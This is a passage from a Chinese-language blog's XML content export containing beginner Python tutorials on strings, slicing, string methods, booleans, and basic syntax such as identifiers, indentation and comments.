MS"><strong>请注意</strong>：<strong><code>&#39;&#39;</code></strong>或<strong><code>&quot;&quot;</code></strong>本身只是一种表示方式，不是字符串的一部分，因此，字符串<strong><code>&#39;abc&#39;</code></strong>只有<strong><code>a</code></strong>，<strong><code>b</code></strong>，<strong><code>c</code></strong>这3个字符。如果<code>&#39;</code>本身也是一个字符，那就可以用<code>&quot;&quot;</code>括起来，比如<code>&quot;I&#39;m OK&quot;</code>包含的字符是<strong><code>I</code></strong>，<strong><code>&#39;</code></strong>，<strong><code>m</code></strong>，<strong><code>空格</code></strong>，<strong><code>O</code></strong>，<strong><code>K</code></strong>这6个字符。<br>即<font color="#FF7F00"><strong>单引号要放到双引号里面，双引号要放到单引号里面</strong></font>。</font></li></ol><br><ol start="2"><li><font color="red" face="Comic sans MS"><strong>使用转义字符“<code>\</code>”</strong></font> ： <font face="Microsoft YaHei">如果字符串内部既包含<strong><code>&#39;</code></strong>又包含<strong><code>&quot;</code></strong>怎么办？可以用转义字符<strong><code>\</code></strong>来标识，比如：</font></li></ol><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'I\'m \"OK\"!'</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运行输出：I'm <span class="token string">"OK"</span>! <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font face="Microsoft YaHei">把双引号括在单引号里面，但是下面的单引号必须转义，如下也是正确的：</font></p><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'I\'m "OK"!'</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><ol start="3"><li><font color="red" face="Comic sans MS"><strong>使用不转义字符“<code>r&#39;&#39;</code>”</strong></font>： <font face="Microsoft YaHei">如果字符串里面有很多字符都需要转义，就需要加很多<strong><code>\</code></strong>，为了简化，Python还允许用<code>r&#39;&#39;</code>表示，<font color="#FF7F00"><strong><code>&#39;&#39;</code>内部的字符串默认不转义</strong></font>，可以自己试试：</font></li></ol><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'\\\t\\'</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>a<span class="token operator">=</span>r<span class="token string">'\\\t\\'</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>输出结果：\    \ \\\t\\ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="4"><li><font color="red" face="Comic sans MS"><strong>在字符串里面有换行，将字符串按照换行输出。使用</strong><code>&#39;&#39;&#39;  内容  &#39;&#39;&#39;</code><strong>：</strong></font><font face="Microsoft YaHei">如果字符串内部有很多换行，用<strong><code>\n</code></strong>写在一行里不好阅读，为了简化，Python允许用<strong><code>&#39;&#39;&#39; 这里写内容&#39;&#39;&#39;</code></strong>的格式表示多行内容，可以自己试试：</font></li></ol><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token triple-quoted-string string">'''helloworldline1line2'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运行输出：hello world line1 line2 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="5"><li><font color="red" face="Comic sans MS"><strong>在字符串里面有换行，将字符串按照换行输出，并且不转义输出字符。使用<code>r&#39;&#39;&#39;  &#39;&#39;&#39;</code>：</strong></font></li></ol><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span>r<span class="token triple-quoted-string string">'''hello \nworldline1line2'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运行输出：hello \n world line1 line2 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h5 id="2-使用字符串-取下标"><font color="#00B2EE" face="Comic sans MS">2.使用字符串(取下标)</font><a href="post/Python-Variables-DataTypes#2-使用字符串-取下标"></a></h5><blockquote><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>python的字串列表有2种取值顺序:</strong></font></font></p><ol><li><font face="Microsoft YaHei">从左到右索引默认<font color="#FF7F00"><strong>0</strong></font>开始的，最大范围是字符串<strong>长度少1</strong>；</font></li><li><font face="Microsoft YaHei">从右到左索引默认-1开始的，最大范围是字符串开头。</font></li></ol></blockquote><div class="article-img"><p><img src="https://i.loli.net/2019/02/27/5c7665042686e.png" alt="python-string-slice.png" data-zoomable></p></div><blockquote><ol start="3"><li><font face="Microsoft YaHei">如果你要实现从字符串中获取一段<strong>子字符串</strong>的话，可以使用 <font color="#FF7F00"><strong>[头下标:尾下标]</strong></font> 来截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。</font></li><li><font face="Microsoft YaHei"><strong><code>[头下标:尾下标]</code></strong> 获取的子字符串包含头下标的字符，但<strong>不包含尾下标的字符</strong>。</font></li></ol></blockquote><br><p>比如:</p><pre class="line-numbers language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'abcdef'</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>运行结果：c bcde <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><font face="Microsoft YaHei">当使用以冒号<strong><code>:</code></strong>分隔的字符串，python 返回一个新的对象，结果包含了以这对偏移标识的连续的内容，左边的开始是包含了下边界。<br>上面的结果包含了 s[1] 的值 b，而取到的最大范围不包括尾下标，就是 s[5] 的值 f。</font></p></blockquote><div class="article-img"><p><img src="https://i.loli.net/2019/02/27/5c76663ee5909.png" alt="9aU.png" data-zoomable></p></div><br><h5 id="3-加号-星号-冒号"><font color="#00B2EE" face="Comic sans MS">3.加号(+)星号(*)冒号(:)</font><a href="post/Python-Variables-DataTypes#3-加号-星号-冒号"></a></h5><blockquote><ol><li><font color="#FF7F00"><strong>加号(+)：</strong></font><strong>拼接字符串；</strong></li><li><font color="#FF7F00"><strong>星号(*)：</strong></font><strong>重复操作；</strong></li><li><font color="#FF7F00"><strong>冒号(:)：</strong></font><strong>截取字符。</strong></li></ol></blockquote><br><ol><li><font color="red"><strong>Python使用加号（ + ）来合并字符串</strong></font></li></ol><pre class="line-numbers language-python"><code class="language-python">first_name <span class="token operator">=</span> <span class="token string">"ada"</span>last_name <span class="token operator">=</span> <span class="token string">"lovelace"</span>full_name <span class="token operator">=</span> first_name <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> last_name<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, "</span> <span class="token operator">+</span> full_name <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">)</span>运行结果：Hello<span class="token punctuation">,</span> ada lovelace! <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="2"><li><font color="red"><strong>Python使用星号（ * ）来重复字符串</strong></font></li></ol><pre class="line-numbers language-python"><code class="language-python">str <span class="token operator">=</span> <span class="token string">'Hello World!'</span>a<span class="token operator">=</span>str<span class="token operator">*</span><span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运行输出：Hello World!Hello World! <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="3"><li><font color="red"><strong>Python使用冒号（ ： ）来截取字符</strong></font></li></ol><pre class="line-numbers language-java"><code class="language-java">#<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python# <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span> UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span>str <span class="token operator">=</span> <span class="token string">'Hello World!'</span>print str           # 输出完整字符串print str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        # 输出字符串中的第一个字符print str<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">5</span><span class="token punctuation">]</span>      # 输出字符串中第三个至第五个之间的字符串print str<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span>       # 输出从第三个字符开始的字符串print str <span class="token operator">*</span> <span class="token number">2</span>       # 输出字符串两次print str <span class="token operator">+</span> <span class="token string">"TEST"</span>  # 输出连接的字符串以上实例输出结果：Hello World<span class="token operator">!</span>Hllollo World<span class="token operator">!</span>Hello World<span class="token operator">!</span>Hello World<span class="token operator">!</span>Hello World<span class="token operator">!</span>TEST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><font face="Microsoft YaHei">Python 列表截取可以接收第三个参数，<font color="#FF7F00"><strong>参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：</strong></font></font></p></blockquote><div class="article-img"><p><img src="https://i.loli.net/2019/02/27/5c766ace2223e.png" alt="python_list_slice_2.png" data-zoomable></p></div><br><h5 id="4-常用的字符串方法"><font color="#00B2EE" face="Comic sans MS">4.常用的字符串方法</font><a href="post/Python-Variables-DataTypes#4-常用的字符串方法"></a></h5><h6 id="1-修改字符串的大小写"><font color="#20B2AA" face="Comic sans MS">1. 修改字符串的大小写</font><a href="post/Python-Variables-DataTypes#1-修改字符串的大小写"></a></h6><blockquote><p><font color="#FF7F00"><strong>使用方法：</strong></font></p><ol><li><strong>upper()</strong>：将字符串<font color="#FF7F00"><strong>所有字母大写</strong></font>；</li><li><strong>lower()</strong>：将字符串<font color="#FF7F00"><strong>所有字母小写</strong></font>；</li><li><strong>title()</strong>：将字符串<font color="#FF7F00"><strong>所有单词首字母大写，并将单词中除了首字母的变为小写</strong></font>。</li></ol></blockquote><br><p>示例代码：</p><pre class="line-numbers language-python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"Hexo lovelace giTHub toMMrow n"</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行输出：HEXO LOVELACE GITHUB TOMMROW N hexo lovelace github tommrow n Hexo Lovelace Github Tommrow N <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font face="Microsoft YaHei">在<strong><code>name.title()</code></strong> 中，name 后面的句点（ <strong><code>.</code></strong> ）让Python对变量name 执行方法title() 指定的操作。每个方法后面都跟着一对括号，这是因为方法通常需要<font color="#FF7F00"><strong>额外的信息来完成其工作</strong></font>。这种信息是在括号内提供的。函数title() 不需要额外的信息，因此它后面的括号是空的。</font></p><br><h6 id="2-暂时-永久删除字符串两端空白"><font color="#20B2AA" face="Comic sans MS">2. 暂时/永久删除字符串两端空白</font><a href="post/Python-Variables-DataTypes#2-暂时-永久删除字符串两端空白"></a></h6><blockquote><p><font color="#FF7F00"><strong>使用方法：</strong></font></p><ol><li><font face="Microsoft YaHei"><strong>strip()：</strong>删除字符串<font color="#FF7F00"><strong>两端</strong></font>空白或换行符；</font></li><li><font face="Microsoft YaHei"><strong>lstrip()：</strong>删除字符串<font color="#FF7F00"><strong>左</strong></font>端空白或换行符；</font></li><li><font face="Microsoft YaHei"><strong>rstrip()：</strong>删除字符串<font color="#FF7F00"><strong>右</strong></font>端空白或换行符；</font></li></ol></blockquote><br><blockquote><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>暂时</strong></font>或者是<font color="#FF7F00"><strong>永久</strong></font>删除的区别是在于调用方法后是否重新赋值给一个变量：</font></p><ol><li><font face="Microsoft YaHei"><strong>不赋值：</strong><font color="#FF7F00">暂时删除，下次调用时还是原字符串</font>；</font></li><li><font face="Microsoft YaHei"><strong>重新赋值：</strong><font color="#FF7F00">永久删除</font>。</font></li></ol></blockquote><br><p>示例代码：</p><pre class="line-numbers language-python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"    HexoAndGithub  "</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>name <span class="token operator">=</span> name<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>运行结果：    HexoAndGithub   HexoAndGithub     HexoAndGithub HexoAndGithub       HexoAndGithub   HexoAndGithub HexoAndGithub HexoAndGithub HexoAndGithub HexoAndGithub <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h6 id="3-内置函数-len-返回字符串长度"><font color="#20B2AA" face="Comic sans MS">3. 内置函数 len()返回字符串长度</font><a href="post/Python-Variables-DataTypes#3-内置函数-len-返回字符串长度"></a></h6><p><font face="Microsoft YaHei">内置函数 len() 返回字符串长度，注意，它<strong>并不是字符串的方法！！！</strong></font></p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token string">'supercalifragilisticexpialidocious'</span>b <span class="token operator">=</span> len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>运行结果：supercalifragilisticexpialidocious <span class="token number">34</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="3-4-布尔值"><font color="#3CB371" face="Comic sans MS">3.4 布尔值</font><a href="post/Python-Variables-DataTypes#3-4-布尔值"></a></h4><ol><li><p><font face="Microsoft YaHei">布尔值和布尔代数的表示完全一致，一个布尔值只有<strong><code>True</code></strong>、<strong><code>False</code></strong>两种值，要么是True，要么是False；</font></p></li><li><p><font face="Microsoft YaHei">在Python中，True、False<font color="#FF7F00"><strong>首字母必须大写</strong></font>。可以直接用True、False表示布尔值，请注意大小写，也可以通过布尔运算计算出来：</font></p></li></ol><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token boolean">True</span>b<span class="token operator">=</span><span class="token number">3</span><span class="token operator">></span><span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>运行结果：<span class="token boolean">True</span> <span class="token boolean">True</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="3"><li><font face="Microsoft YaHei"><strong>布尔值可以用<code>and</code>、<code>or</code>和<code>not</code>运算</strong></font><ol><li><font face="Microsoft YaHei"><strong><code>and</code></strong>运算是<strong>与运算</strong>，只有<font color="#FF7F00"><strong>所有都为True，and运算结果才是True</strong></font> </font></li><li><font face="Microsoft YaHei"><strong><code>or</code></strong>运算是<strong>或运算</strong>，只要<font color="#FF7F00"><strong>其中有一个为True，or运算结果就是True</strong></font> </font></li><li><font face="Microsoft YaHei"><strong><code>not</code></strong>运算是<strong>非运算</strong>，它是一个单目运算符，<font color="#FF7F00"><strong>把True变成False，False变成True</strong></font> </font>s</li></ol></li></ol><br><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">></span> <span class="token number">3</span> <span class="token operator">and</span> <span class="token number">3</span> <span class="token operator">&lt;</span> <span class="token number">1</span>b<span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">></span> <span class="token number">3</span> <span class="token operator">or</span> <span class="token number">1</span> <span class="token operator">></span> <span class="token number">3</span>c<span class="token operator">=</span> <span class="token operator">not</span> <span class="token number">1</span> <span class="token operator">></span> <span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>运行结果：<span class="token boolean">False</span> <span class="token boolean">True</span> <span class="token boolean">True</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-基础语法</title>
      <link href="/post/Python-Grammar/"/>
      <url>/post/Python-Grammar/</url>
      
        <content type="html"><![CDATA[<p>请务必注意，Python程序是<font color="#FF7F00"><strong>大小写敏感</strong></font>的，如果写错了大小写，程序会报错。</p><a id="more"></a><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">Python 基础语法</font> </center><p>&emsp;<br>&emsp;</p><h3 id="一-标识符"><font color="#FF6347" face="Comic sans MS">一. 标识符</font><a href="post/Python-Grammar#一-标识符"></a></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、标识符定义规则</strong></font></p><ol><li><p>在 Python 里，标识符由<font color="#FF7F00"><strong>字母</strong></font>、<font color="#FF7F00"><strong>数字</strong></font>、<font color="#FF7F00"><strong>下划线</strong></font>组成。</p></li><li><p>在 Python 中，所有标识符<font color="#FF7F00"><strong>不能以数字开头</strong></font>。</p></li><li><p>Python 中的标识符<font color="#FF7F00"><strong>是区分大小写的</strong></font>。</p></li><li><p>以<font color="#FF7F00"><strong>下划线开头</strong></font>的标识符是<font color="#FF7F00"><strong>有特殊意义</strong></font>的。</p><ol><li>以单下划线开头 <code>_foo</code> 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 from xxx import * 而导入。</li><li>以双下划线开头的 <code>__foo</code> 代表类的私有成员，以双下划线开头和结尾的 <code>__foo__</code>代表 Python 里特殊方法专用的标识，如 <code>__init__()</code> 代表类的构造函数。</li></ol></li></ol><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、Python 保留字符</strong></font></p><p>下面的列表显示了在Python中的保留字。这些保留字<font color="#FF7F00"><strong>不能用作常数或变数，或任何其他标识符名称</strong></font>。</p><p>|||<br>:-:|:-:|:-:|<br>and    |exec    |not<br>assert    |finally    |or<br>break    |for    |pass<br>class    |from    |print<br>continue    |global    |raise<br>def    |if    |return<br>del    |import    |try<br>elif    |in    |while<br>else    |is    |with<br>except    |lambda    |yield</p><br><h3 id="二-缩进-代码块"><font color="#FF6347" face="Comic sans MS">二. 缩进(代码块)</font><a href="post/Python-Grammar#二-缩进-代码块"></a></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、注意事项：</strong></font></p><ol><li><p>学习 Python 与其他语言最大的区别就是，Python 的<font color="#FF7F00"><strong>代码块不使用大括号 <code>{}</code> 来控制类，函数以及其他逻辑判断</strong></font>。python 最具特色的就是<font color="#FF7F00"><strong>用缩进来写模块</strong></font>。</p></li><li><p>缩进的空白数量是可变的，但是<font color="#FF7F00"><strong>所有代码块语句必须包含相同的缩进空白数量</strong></font>，<strong>这个必须严格执行</strong>！！！</p><ol><li>按照约定俗成的管理，应该始终坚持使用<font color="red"><strong>4个空格</strong></font>的缩进；</li><li>很多Python程序员都建议每行不超过80字符（最多79个见多）；</li><li>要将程序的不同部分分开，可使用空行，但不要在程序文件中过多地使用空行</li></ol></li></ol><br><p>以下代码将会执行错误：<strong>缩进空白数量不一样会报错！</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># 文件名：test.py</span><span class="token keyword">if</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"Answer"</span>    <span class="token keyword">print</span> <span class="token string">"True"</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"Answer"</span>    <span class="token comment" spellcheck="true"># 没有严格缩进，在执行时会报错</span>  <span class="token keyword">print</span> <span class="token string">"False"</span>执行以上代码，会出现如下错误提醒：$ python test<span class="token punctuation">.</span>py    File <span class="token string">"test.py"</span><span class="token punctuation">,</span> line <span class="token number">10</span>    <span class="token keyword">print</span> <span class="token string">"False"</span>                <span class="token operator">^</span>IndentationError<span class="token punctuation">:</span> unindent does <span class="token operator">not</span> match any outer indentation level<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、多个语句构成代码块</strong></font></p><ol><li><p>Python不像C/C++/Java一样一条语句是以<code>;</code>结束，而是<font color="#FF7F00"><strong>换行即表示一个语句结束</strong></font>。</p></li><li><p>缩进相同的一组语句构成一个<strong>代码块</strong>，我们称之代码组。</p></li><li><p>像if、while、def和class这样的复合语句，<strong>首行以关键字开始</strong>，<strong>以冒号( <code>:</code> )结束</strong>，该行之后的一行或多行缩进代码构成代码组。注意这里冒号( <code>:</code> )不能省略。</p></li></ol><br><p>如下实例的冒号不能省略：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> expression <span class="token punctuation">:</span>    suite <span class="token keyword">elif</span> expression <span class="token punctuation">:</span>     suite  <span class="token keyword">else</span> <span class="token punctuation">:</span>     suite <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="三-一行和多行语句"><font color="#FF6347" face="Comic sans MS">三. 一行和多行语句</font><a href="post/Python-Grammar#三-一行和多行语句"></a></h3><blockquote><p><font color="red"><strong>一行</strong></font>分为：</p><ol><li><font color="#FF7F00"><strong>同一行显示多条语句</strong></font>;</li><li>将一行的语句分为多行显示(<font color="#FF7F00"><strong>一条语句以多行来书写</strong></font>)也包括在多行语句里面来讲。</li></ol></blockquote><br><p><font color="#00B2EE" face="Comic sans MS"><strong>1. 同一行显示多条语句</strong></font></p><p>Python可以在同一行中使用多条语句，语句之间<strong>使用分号( <code>;</code> )分割</strong>，以下是一个简单的实例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> sys<span class="token punctuation">;</span> x <span class="token operator">=</span> <span class="token string">'runoob'</span><span class="token punctuation">;</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>运行输出：runoob<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>3. 一条语句以多行来书写</strong></font></p><p>看下面的多行语句即可，是同一个意思。</p><br><p><font color="#00B2EE" face="Comic sans MS"><strong>3. 多行语句</strong></font></p><blockquote><p><font color="red"><strong>多行</strong></font>：</p><ol><li>Python语句中一般<font color="#FF7F00"><strong>以新行作为语句的结束符</strong></font>，但是我们可以使用斜杠（  <code>\</code> ）将一行的语句分为多行显示，斜杠（  <code>\</code> ）称为<code>多行连接符</code>。</li><li>语句中包含 [], {} 或 () 括号就<strong>不需要</strong>使用多行连接符。</li></ol></blockquote><ol><li><font color="#FF7F00"><strong>Python语句中一般以新行作为语句的结束符</strong></font>。但是我们可以使用斜杠（  <code>\</code> ）将一行的语句分为多行显示，如下所示：</li></ol><pre class="line-numbers language-python"><code class="language-python">total <span class="token operator">=</span> item_one <span class="token operator">+</span> \        item_two <span class="token operator">+</span> \        item_three<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><ol start="2"><li>语句中包含 [], {} 或 () 括号就不需要使用多行连接符。如下实例：</li></ol><pre class="line-numbers language-python"><code class="language-python">days <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Monday'</span><span class="token punctuation">,</span> <span class="token string">'Tuesday'</span><span class="token punctuation">,</span> <span class="token string">'Wednesday'</span><span class="token punctuation">,</span>        <span class="token string">'Thursday'</span><span class="token punctuation">,</span> <span class="token string">'Friday'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><h3 id="四-引号"><font color="#FF6347" face="Comic sans MS">四. 引号</font><a href="post/Python-Grammar#四-引号"></a></h3><ol><li><p>Python 可以使用单引号( <code>&#39;</code> )、双引号( <code>&quot;</code> )、三引号( <code>&#39;&#39;&#39;</code> 或 <code>&quot;&quot;&quot;</code> ) <strong>来表示字符串</strong>，引号的开始与结束必须的相同类型的。</p></li><li><p><strong>其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，</strong><font color="#FF7F00"><strong>被当做注释</strong></font>。</p></li></ol><p>如下示例：</p><pre class="line-numbers language-python"><code class="language-python">word <span class="token operator">=</span> <span class="token string">'word'</span>sentence <span class="token operator">=</span> <span class="token string">"这是一个句子。"</span>paragraph <span class="token operator">=</span> <span class="token triple-quoted-string string">"""这是一个段落。包含了多个语句"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="五-注释"><font color="#FF6347" face="Comic sans MS">五. 注释</font><a href="post/Python-Grammar#五-注释"></a></h3><ol><li><font color="#FF7F00"><strong>python中单行注释采用 <code>#</code> 开头。</strong></font></li><li>python 中多行注释使用三个单引号( <code>&#39;&#39;&#39;</code> )或三个双引号( <code>&quot;&quot;&quot;</code> )。</li></ol><p>单行注释,如下示例1：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># 文件名：test.py</span><span class="token comment" spellcheck="true"># 第一个注释</span><span class="token keyword">print</span> <span class="token string">"Hello, Python!"</span>  <span class="token comment" spellcheck="true"># 第二个注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>多行注释,如下示例2：<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># 文件名：test.py</span><span class="token triple-quoted-string string">'''这是多行注释，使用单引号。这是多行注释，使用单引号。这是多行注释，使用单引号。'''</span><span class="token triple-quoted-string string">"""这是多行注释，使用双引号。这是多行注释，使用双引号。这是多行注释，使用双引号。"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="六-空行"><font color="#FF6347" face="Comic sans MS">六. 空行</font><a href="post/Python-Grammar#六-空行"></a></h3><blockquote><ol><li>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</li><li>空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于<font color="#FF7F00"><strong>分隔两段不同功能或含义的代码，便于日后代码的维护或重构</strong></font>。</li><li>记住：<font 